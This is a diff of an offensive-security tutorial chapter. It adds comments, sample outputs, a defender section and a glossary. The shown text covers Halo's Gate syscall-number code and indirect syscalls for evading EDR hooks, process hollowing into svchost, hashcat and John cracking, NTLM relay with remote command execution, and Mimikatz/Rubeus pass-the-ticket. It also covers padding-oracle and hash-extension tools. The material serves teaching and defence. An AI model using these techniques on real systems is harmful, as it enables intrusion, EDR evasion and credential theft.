     if (bytes[0] == 0x4c && bytes[3] == 0xb8)
-        return *(DWORD*)(bytes + 4);
+        return *(DWORD*)(bytes + 4);  // unhooked — read SSN directly
 
-    // Check function ABOVE (subtract one syscall stub size, typically 32 bytes)
-    // SSN of neighbor - offset = our SSN
+    // Check function ABOVE and BELOW in memory
+    // SSN is sequential: neighbor_ssn ± offset = our SSN
     for (int offset = 1; offset < 500; offset++) {
-        BYTE* neighbor_up = bytes - (offset * 32);  // stub size varies
+        BYTE* neighbor_up = bytes - (offset * 32);    // function above (stubs are ~32 bytes)
         if (neighbor_up[0] == 0x4c && neighbor_up[3] == 0xb8) {
+            // Found unhooked neighbor above — our SSN = neighbor's SSN + offset
             return *(DWORD*)(neighbor_up + 4) + offset;
         }
-        BYTE* neighbor_down = bytes + (offset * 32);
+        BYTE* neighbor_down = bytes + (offset * 32);  // function below
         if (neighbor_down[0] == 0x4c && neighbor_down[3] == 0xb8) {
+            // Found unhooked neighbor below — our SSN = neighbor's SSN - offset
             return *(DWORD*)(neighbor_down + 4) - offset;
         }
     }
-    return 0;
+    return 0;  // couldn't find any unhooked neighbor within 500 stubs
 }
 ```
 
@@ -737,14 +1037,14 @@ skipping the hooked prologue.
 ```nasm
 ; Indirect syscall pattern:
 ; 1. Resolve SSN (Hell's Gate / Halo's Gate)
-; 2. Find 'syscall; ret' gadget in ntdll
+; 2. Find 'syscall; ret' gadget in ntdll (scan ntdll .text for 0f 05 c3)
 ; 3. Set up registers as if ntdll did it
-; 4. JMP to the gadget
+; 4. JMP to the gadget — syscall executes FROM ntdll's memory range
 
-mov r10, rcx
-mov eax, 0x18                    ; SSN
-jmp qword ptr [syscall_gadget]   ; JMP to ntdll's syscall;ret
-; Return address on stack points to ntdll — EDR sees nothing unusual
+mov r10, rcx                          ; syscall calling convention
+mov eax, 0x18                         ; SSN resolved at runtime
+jmp qword ptr [syscall_gadget]        ; JMP into ntdll — 'syscall; ret' is there
+; Stack return address points back to ntdll — EDR sees nothing unusual
 ```
 
 ### Module Stomping
@@ -772,11 +1072,11 @@ in Task Manager, running from a trusted path.
 
 ```
 1. CreateProcess("svchost.exe", ..., CREATE_SUSPENDED)
-2. NtUnmapViewOfSection(process, base_address)      // hollow it out
-3. VirtualAllocEx(process, base_address, ...)        // allocate new space
-4. WriteProcessMemory(process, base_address, payload, ...)  // write your PE
-5. SetThreadContext(thread, ...)                      // fix entry point
-6. ResumeThread(thread)                              // execute
+2. NtUnmapViewOfSection(process, base_address)      // hollow it out — unmap original image
+3. VirtualAllocEx(process, base_address, ...)        // allocate space for our PE
+4. WriteProcessMemory(process, base_address, payload, ...)  // write our PE into it
+5. SetThreadContext(thread, ...)                      // redirect entry point to our code
+6. ResumeThread(thread)                              // let it run — our code executes
 ```
 
 From the outside: `svchost.exe` running from `C:\Windows\System32\`.
@@ -856,10 +1156,10 @@ $6$rounds=5000$saltsalt$hash...
 ### Hashcat — GPU-Accelerated Cracking
 
 ```bash
-# Basic dictionary attack
+# Basic dictionary attack — try every word in rockyou.txt as the password
 hashcat -m 1000 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt
 
-# Dictionary + rules (applies transformations to each word)
+# Dictionary + rules (applies transformations to each word — adds numbers, swaps case, etc.)
 hashcat -m 1000 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
 
 # Common rule files:
@@ -870,39 +1170,58 @@ hashcat -m 1000 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/h
 #   dive.rule       — comprehensive
 
 # Mask attack (brute force with pattern)
-# ?l = lowercase, ?u = uppercase, ?d = digit, ?s = special
-hashcat -m 1000 hash.txt -a 3 ?u?l?l?l?l?l?d?d   # Password12 pattern
-hashcat -m 1000 hash.txt -a 3 ?d?d?d?d?d?d?d?d    # 8-digit PIN
+# ?l = lowercase letter, ?u = uppercase, ?d = digit, ?s = special char
+hashcat -m 1000 hash.txt -a 3 ?u?l?l?l?l?l?d?d   # matches: Password12 pattern
+hashcat -m 1000 hash.txt -a 3 ?d?d?d?d?d?d?d?d    # matches: 8-digit PIN (12345678)
 
 # Hybrid: dictionary + mask
-hashcat -m 1000 hash.txt -a 6 rockyou.txt ?d?d?d?d  # word + 4 digits
-hashcat -m 1000 hash.txt -a 7 ?d?d?d?d rockyou.txt  # 4 digits + word
+hashcat -m 1000 hash.txt -a 6 rockyou.txt ?d?d?d?d  # word + 4 digits (password1234)
+hashcat -m 1000 hash.txt -a 7 ?d?d?d?d rockyou.txt  # 4 digits + word (1234password)
 
 # Kerberoast cracking
 hashcat -m 13100 tgs_hashes.txt rockyou.txt -r best64.rule
 
-# Show cracked passwords
+# Show cracked passwords (after the attack finishes)
 hashcat -m 1000 hash.txt --show
 
-# Performance stats
+# Performance stats — see how fast your GPU cracks each hash type
 hashcat -b   # benchmark all modes
 ```
+
+### Expected Output
+
+**Successful crack:**
+```
+31d6cfe0d16ae931b73c59d7e0c089c0:<empty>   (empty password)
+-- or --
+aabbcc...:<cracked_password>
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 1000 (NTLM)
+```
+
+**Failure looks like `No hashes loaded` — check your hash file format. NTLM should be just the hash, one per line: `31d6cfe0d16ae931b73c59d7e0c089c0`**
+
+**Failure looks like `No devices found/left` — hashcat can't find your GPU. Run `hashcat -I` to see detected devices. On Windows with NVIDIA, ensure CUDA drivers are installed.**
+
+---
 
 ### John the Ripper
 
 ```bash
-# Basic attack
+# Basic attack — John auto-detects hash type
 john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
 
 # With rules (John has its own rule syntax)
 john --wordlist=rockyou.txt --rules=jumbo hashes.txt
 
-# Specify hash format
+# Specify hash format explicitly
 john --format=nt hashes.txt              # NTLM
 john --format=netntlmv2 hashes.txt      # Net-NTLMv2
 john --format=krb5tgs hashes.txt        # Kerberoast
 
-# Show cracked
+# Show cracked passwords
 john --show hashes.txt
 
 # Create custom rules in john.conf:
@@ -911,6 +1230,21 @@ john --show hashes.txt
 # c                        # capitalize first letter
 # $[!@#$%]                # append special char
 ```
+
+### Expected Output
+
+**Successful crack:**
+```
+Loaded 1 password hash (NT [MD4 128/128 AVX 4x3])
+password123      (Administrator)
+1g 0:00:00:02 DONE (2026-01-01 12:00) ...
+```
+
+**Failure looks like `No password hashes loaded` — John didn't recognise the format. Add `--format=nt` explicitly for NTLM hashes.**
+
+**Failure looks like `0 password hashes cracked, 1 left` after rockyou finishes — the password isn't in the list. Try a different wordlist or switch to hashcat with rules.**
+
+---
 
 ### When To Crack vs When To Relay
 
@@ -923,18 +1257,32 @@ needed. The victim authenticates to you, you forward that authentication
 to the target. If the victim has admin rights on the target — you win.
 
 ```bash
-# NTLM relay with impacket
-ntlmrelayx.py -t <target_ip> -smb2support
+# NTLM relay with impacket (WSL2 or Linux)
+ntlmrelayx.py -t <target_ip> -smb2support  # relay to SMB on target
 
 # Relay to multiple targets from a list
 ntlmrelayx.py -tf targets.txt -smb2support
 
-# Relay and execute a command
+# Relay and execute a command on the target
 ntlmrelayx.py -t <target> -smb2support -c "whoami"
 
-# Relay to LDAP (for adding a machine account, modifying ACLs)
+# Relay to LDAP (for adding a machine account, modifying ACLs — AD attack path)
 ntlmrelayx.py -t ldaps://<dc_ip> --add-computer
 ```
+
+### Expected Output
+
+**Successful relay:**
+```
+[*] Servers started, waiting for connections
+[*] SMBD: Received connection from <victim_ip>
+[*] Authenticating against smb://<target_ip> as DOMAIN\user SUCCEED
+[*] Service RemoteRegistry is in stopped state
+[*] Starting service RemoteRegistry
+[*] Target system bootkey: ...
+```
+
+**Failure looks like `STATUS_ACCESS_DENIED` — the relayed user doesn't have admin rights on the target. Try a different target or wait for a higher-privilege user to authenticate.**
 
 ---
 
@@ -965,9 +1313,24 @@ per byte) but it works against any application that leaks padding
 validity.
 
 ```bash
-# PadBuster example
+# PadBuster example (run inside WSL2)
+# padbuster sends modified requests and watches for padding error vs other errors
 padbuster <target_url> <encrypted_cookie> <block_size> -cookies "auth=<value>"
 ```
+
+### Expected Output
+
+```
+[+] Decrypting Bytes
+[+] Block 1 Results:
+    [+] Cipher Text (HEX): ...
+    [+] Intermediate Bytes (HEX): ...
+    [+] Plain Text: username=admin
+```
+
+**Failure looks like `[ERROR] All of the responses were the same length` — the server isn't leaking padding validity through response size. Try checking response time (`-usebody`) or error message content (`-error`).**
+
+---
 
 **Where you'll see this**: Encrypted cookies, encrypted URL parameters,
 any application using CBC mode where the server's error behavior differs
@@ -1010,10 +1373,10 @@ which machine presents it.
 
 ```bash
 # Export TGT from compromised machine (Mimikatz)
-sekurlsa::tickets /export
+sekurlsa::tickets /export  # dumps all Kerberos tickets to .kirbi files
 
 # Import on attacker machine (Rubeus)
-Rubeus.exe ptt /ticket:ticket.kirbi
+Rubeus.exe ptt /ticket:ticket.kirbi  # inject ticket into current session
 
 # Now you have the user's Kerberos identity
 # All network access uses their credentials
@@ -1032,7 +1395,8 @@ use HMAC (which double-hashes with the key) instead of raw
 `H(key || data)`.
 
 ```bash
-# hash_extender tool
+# hash_extender tool (WSL2)
+# --data = original message | --append = data to add | --signature = original hash
 hash_extender --data "original_data" --secret-min 10 --secret-max 30 \
     --append "admin=true" --signature <original_hash> --format sha256
 ```
@@ -1078,6 +1442,28 @@ There is no permanent bypass. There is only the current gap between
 what you do and what they check. Your job is to stay ahead of that
 gap — not by learning one trick, but by understanding the MECHANISMS
 well enough to improvise when the playbook stops working.
+
+---
+
+## DEFENDER TAKEAWAY
+
+You now know exactly what attackers do. Here's what to do with that knowledge on Monday morning.
+
+- **Enforce NTLMv2 minimum and disable NTLMv1.** Open Group Policy: `Computer Configuration → Windows Settings → Security Settings → Local Policies → Security Options → Network Security: LAN Manager authentication level`. Set to "Send NTLMv2 response only. Refuse LM & NTLM." This kills NTLM downgrade attacks and NTLMv1 rainbow-table cracking in one policy change.
+
+- **Enable Windows Defender Credential Guard.** This isolates LSASS in a hardware-protected enclave. Mimikatz can't dump hashes from LSASS if Credential Guard is running. Policy path: `Computer Configuration → Administrative Templates → System → Device Guard → Turn on Virtualization Based Security`. Requires UEFI + Secure Boot.
+
+- **Monitor Event ID 4625 (failed logon) and 4648 (logon with explicit credentials) in bulk.** Pass-the-Hash and pass-the-ticket attacks generate logon events with `Logon Type 3` (network) from unusual source machines. A spike in 4625 from a single source IP is a spray attack. Alert on it. Configure in Windows Event Forwarding or your SIEM.
+
+- **Audit Event ID 4688 (new process creation) with command line logging enabled.** Enable via `Computer Configuration → Administrative Templates → System → Audit Process Creation → Include command line in process creation events`. This catches `powershell -enc ...` and `wscript ...` one-liners that attackers use for initial execution. Command lines are logged in full.
+
+- **Block PowerShell -EncodedCommand execution in Constrained Language Mode.** Enforce PowerShell Constrained Language Mode via AppLocker or Windows Defender Application Control (WDAC). This doesn't stop all PowerShell abuse but eliminates the dumbest 80% of it. Set `__PSLockdownPolicy` or configure a WDAC policy.
+
+- **Deploy memory integrity (HVCI — Hypervisor-Protected Code Integrity).** HVCI prevents unsigned kernel drivers and makes kernel-level EDR hooks harder to bypass. Enable in Windows Security → Device Security → Core isolation → Memory integrity. Note: may break older device drivers — test first.
+
+- **Hunt for process hollowing with Event ID 10 (process access) in Sysmon.** Install Sysmon (free, Microsoft Sysinternals) with a config that logs `ProcessAccess` events. Hollowing requires `VirtualAllocEx` + `WriteProcessMemory` + `SetThreadContext` on a remote process. Sysmon logs the access rights requested — `0x1F0FFF` (all access) on `svchost.exe` from a non-system process is a red flag.
+
+- **Rotate service account passwords frequently and audit Kerberoastable accounts.** Run `Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName` to find Kerberoastable accounts. Any service account SPN that an attacker can request a TGS for is a cracking target. Use 30+ character random passwords for service accounts, or migrate to gMSA (Group Managed Service Accounts) which rotate automatically.
 
 ---
 
@@ -1128,3 +1514,34 @@ well enough to improvise when the playbook stops working.
   defense is continuous. Understanding the MECHANISMS — not just the
   techniques — is what lets you adapt when the current playbook gets
   burned.
+
+---
+
+## Key Terms
+
+| Term | Definition |
+|------|-----------|
+| AES-CBC | Advanced Encryption Standard in Cipher Block Chaining mode. Industry-standard symmetric cipher. Each block XOR'd with previous ciphertext before encryption. |
+| RC4 | Stream cipher. Generates a keystream from a key, XORs with plaintext. Simple to implement, adequate for payload obfuscation. |
+| XOR cipher | Bitwise XOR operation with a key. Reversible — same operation encrypts and decrypts. Weak with short keys. |
+| IV (Initialization Vector) | Random bytes used to seed the first block in CBC mode. Must be unique per encryption. Transmitted alongside ciphertext, not a secret. |
+| PKCS7 padding | Padding scheme that fills the last block to a multiple of the block size. Byte value = number of padding bytes added. |
+| NTLM hash | Windows password hash: MD4(UTF-16LE(password)). No salt. Usable directly for pass-the-hash authentication. |
+| Pass-the-Hash | Authenticating to Windows using an NTLM hash directly, without knowing the plaintext password. |
+| Pass-the-Ticket | Injecting a stolen Kerberos TGT or TGS into the current session to assume that user's identity. |
+| Kerberoasting | Requesting a TGS-REP for a service account SPN, extracting the RC4-encrypted ticket, cracking it offline. |
+| Direct syscall | Invoking kernel functions with an inline `syscall` instruction, bypassing ntdll.dll and its EDR hooks. |
+| SSN (Syscall Service Number) | The number that identifies a specific kernel function. Changes between Windows builds. |
+| Hell's Gate | Technique to read the SSN from ntdll's in-memory function bytes. Fails if the function is hooked. |
+| Halo's Gate | Extension of Hell's Gate that infers the SSN from neighboring unhooked functions when the target is hooked. |
+| Indirect syscall | Direct syscall variant where the `syscall; ret` gadget is borrowed from ntdll's address range, hiding the true call origin. |
+| Process hollowing | Creating a suspended legitimate process, replacing its memory with a payload, resuming execution under the legitimate process name. |
+| Module stomping | Overwriting a loaded legitimate DLL's code section with shellcode so memory scanners see a trusted module name at that address. |
+| Early Bird injection | APC injection technique that fires before EDR hooks are initialized, during the target process's startup. |
+| Thread execution hijack | Redirecting an existing thread's instruction pointer to shellcode without creating a new thread. |
+| Padding oracle attack | Attack on CBC encryption where server error behavior leaks padding validity, enabling full decryption without the key. |
+| NTLM relay | Forwarding a victim's NTLM authentication in real-time to a different target, gaining access without cracking. |
+| Hashcat | GPU-accelerated password hash cracker. Supports dictionary, mask, hybrid, and rule-based attacks. |
+| pycryptodome | Python cryptography library. Install with `pip install pycryptodome`. Provides `Crypto.*` namespace. |
+| ETW (Event Tracing for Windows) | Windows kernel telemetry subsystem. EDR uses ETW to monitor system calls even when ntdll hooks are bypassed. |
+| AMSI (Antimalware Scan Interface) | Windows API that lets AV engines scan script content (PowerShell, VBScript, JScript) before execution. Decodes base64 automatically. |
